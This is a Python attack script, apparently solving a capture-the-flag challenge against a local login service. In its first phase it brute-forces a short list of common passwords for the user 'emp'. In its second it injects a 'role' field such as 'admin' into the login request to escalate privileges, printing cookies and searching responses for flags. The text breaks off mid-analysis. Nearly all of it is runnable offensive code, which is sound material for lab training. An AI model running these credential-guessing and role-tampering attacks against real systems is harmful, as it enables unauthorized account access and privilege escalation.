import requests
import re

target_url = "http://127.0.0.1:5003/login"
username = "emp"
passwords = ["password", "Password123", "emp123", "employee", "emppassword123", 
             "admin", "123456", "password123", "emp", "welcome"]

print("[*] Testing password brute-force for username: emp\n")

valid_passwords = []

# Phase 1: Brute-force passwords
for password in passwords:
    data = {
        "username": username,
        "password": password
    }
    
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    
    try:
        response = requests.post(target_url, data=data, headers=headers, allow_redirects=False)
        
        # Check for success indicators
        if response.status_code in [200, 302] or "success" in response.text.lower():
            print(f"[+] VALID: password='{password}' | Status: {response.status_code}")
            valid_passwords.append(password)
            
    except Exception as e:
        print(f"[ERROR] Password '{password}': {e}")

if not valid_passwords:
    print("\n[×] No valid passwords found")
else:
    print(f"\n[*] Found {len(valid_passwords)} valid password(s)")
    
    # Phase 2: Role parameter manipulation
    test_password = valid_passwords[0]
    print(f"\n[*] Testing role manipulation with password: {test_password}\n")
    
    roles = ["employee", "admin", None]
    results = {}
    
    for role in roles:
        role_label = role if role else "no_role"
        print(f"[TEST] role={role_label}")
        
        data = {"username": username, "password": test_password}
        if role:
            data["role"] = role
        
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        
        try:
            resp = requests.post(target_url, data=data, headers=headers, allow_redirects=False)
            results[role_label] = resp
            
            print(f"  Status: {resp.status_code}")
            print(f"  Cookies: {dict(resp.cookies)}")
            print(f"  Response: {resp.text}\n")
            
            # Search for flags
            flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
            if flags:
                print(f"  [!!! FLAG FOUND !!!] {flags}\n")
                
        except Exception as e:
            print(f"  [ERROR] {e}\n")
    
    # Analysis
    print("\n" + "="*60)
    print("[ANALYSIS]")
    print("="*60)
    
    if "employee" in results and "admin" in results:
